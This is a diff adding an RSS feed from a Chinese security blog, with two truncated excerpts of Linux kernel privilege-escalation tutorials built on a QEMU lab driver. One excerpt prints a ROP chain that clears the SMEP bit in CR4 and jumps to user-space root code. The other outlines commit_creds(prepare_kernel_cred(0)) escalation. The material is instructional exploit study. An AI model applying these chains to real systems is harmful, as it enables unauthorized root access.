@@ -1,0 +1,30 @@
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+        <title>rop - 标签 - povcfe&#39;s blog</title>
+        <link>https://povcfe.github.io/tags/rop/</link>
+        <description>rop - 标签 - povcfe&#39;s blog</description>
+        <generator>Hugo -- gohugo.io</generator><language>zh-CN</language><lastBuildDate>Mon, 06 Jan 2020 10:30:45 -0800</lastBuildDate><atom:link href="https://povcfe.github.io/tags/rop/" rel="self" type="application/rss+xml" /><item>
+    <title>linux 内核提权总结(demo&#43;exp分析) -- ROP(二)</title>
+    <link>https://povcfe.github.io/posts/kernel_rop2/</link>
+    <pubDate>Mon, 06 Jan 2020 10:30:45 -0800</pubDate>
+    <author>作者</author>
+    <guid>https://povcfe.github.io/posts/kernel_rop2/</guid>
+    <description><![CDATA[发表于看雪论坛
+ret2usr CR4篇   smep: smep是内核的一种保护措施, 使得内核不可执行用户态代码
+ 内核通过CR4寄存器的第20位来控制smep, 第20位为0时，smep被关闭    攻击流程
+ 提前在用户态代码中构造进程提权代码(get_root) ROP技术修改CR4第20位数据为0(关闭smep), 通常使用 mov cr4, 0x6f0 修改 rip 直接指向用户态提权代码,实现进程提权    一. 判断是否开启smep  查看 boot.sh qemu-system-x86_64 \ -kernel bzImage \ -initrd rootfs.img \ -append &#34;console=ttyS0 root=/dev/ram rdinit=/sbin/init&#34; \ -cpu qemu64,+smep,+smap \ -nographic \ -gdb tcp::1234  smep, smap 在boot.sh -cpu选项内进行设置  二. ROP链构造 ROP[i++] = 0xffffffff810275f1 + offset; //pop rax; ret  ROP[i++] = 0x6f0; ROP[i++] = 0xffffffff8123ed93 + offset; //pop rcx; ret  ROP[i++] = 0; ROP[i++] = 0xffffffff81003c0e + offset; //mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret  ROP[i++] = 0; ROP[i++] = (size_t)get_root; 三.]]></description>
+</item><item>
+    <title>linux 内核提权总结(demo&#43;exp分析) -- ROP(一)</title>
+    <link>https://povcfe.github.io/posts/kernel_rop1/</link>
+    <pubDate>Wed, 01 Jan 2020 10:29:38 -0800</pubDate>
+    <author>作者</author>
+    <guid>https://povcfe.github.io/posts/kernel_rop1/</guid>
+    <description><![CDATA[发表于看雪论坛
+基础ROP篇(linux 5.0.21)  内核提权与用户态攻击的区别
+   攻击流程
+ 用户态攻击: 执行 system(&quot;/bin/sh&quot;) 获得shell 内核提权:  内核执行 commit_creds(prepare_kernel_cred(0)) 使进程获得root权限 用户态进程执行system(&quot;/bin/sh&quot;) 获得root权限 shell      理解难点
+ 内核rop链构造 用户态进程与内核之间的切换    一. 漏洞分析 (建议初学者先了解基础的驱动程序知识)   查看驱动安全机制
+checksec rop.ko [*] '/home/povcfe/linux/flod/rop.ko' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x0)  发现开启canary和NX    查看qemu启动脚本boot.sh
+ boot.sh  qemu-system-x86_64 \ -kernel bzImage \ -initrd rootfs.]]></description>
+</item></channel>
+</rss>
